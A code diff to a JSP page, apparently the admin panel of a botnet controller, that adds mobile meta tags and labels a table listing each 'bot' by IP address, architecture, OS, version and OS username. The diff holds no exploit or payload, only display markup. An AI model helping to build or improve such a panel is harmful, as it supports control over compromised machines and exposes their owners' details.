@@ -6,6 +6,19 @@
    <link rel="icon" type="image/x-icon" href="/images/favicon.ico">
    <meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
    <title>&#9618;&#9618;&#9618;&#9618;&#9618;&#9618;&#9618;&#9618;&#9618;&#9618;</title>
+   
+   <!-- Add to homescreen for Chrome on Android -->
+    <meta name="mobile-web-app-capable" content="yes">
+
+    <!-- Add to homescreen for Safari on iOS -->
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="apple-mobile-web-app-title" content="Material Design Lite">
+
+    <!-- Tile icon for Win8 (144x144 + tile color) -->
+    <meta name="msapplication-TileImage" content="/images/touch/ms-touch-icon-144x144-precomposed.png">
+    <meta name="msapplication-TileColor" content="#3372DF">
+    
    <script src="https://storage.googleapis.com/code.getmdl.io/1.0.4/material.min.js"></script>
    <link href="<c:url value='/css/app.css' />" rel="stylesheet"></link>
    <link rel="stylesheet" href="https://storage.googleapis.com/code.getmdl.io/1.0.4/material.red-purple.min.css" /> 
@@ -70,21 +83,22 @@
 	<div class="general-card">
 	<div class="general-form">
 		
+	<div class="generic-container">
 	<div><p>Lista Bot</p></div>
 
 			<tbody>
 				<c:forEach items="${bots}" var="bot">
 					<tr>
-						<td>${bot.ip}</td>
-						<td>${bot.arch}</td>
-						<td>${bot.os}</td>
-						<td>${bot.ver}</td>
-						<td>${bot.usernameOS}</td>
+						<td>IP: </td><td>${bot.ip}</td>
+						<td>Architecture: </td><td>${bot.arch}</td>
+						<td>OS: </td><td>${bot.os}</td>
+						<td>Version: </td><td>${bot.ver}</td>
+						<td>Username: </td><td>${bot.usernameOS}</td>
 					</tr>
 				</c:forEach>
 	    		</tbody>
 
-
+	</div>
    </div>
    </div>
    </div>
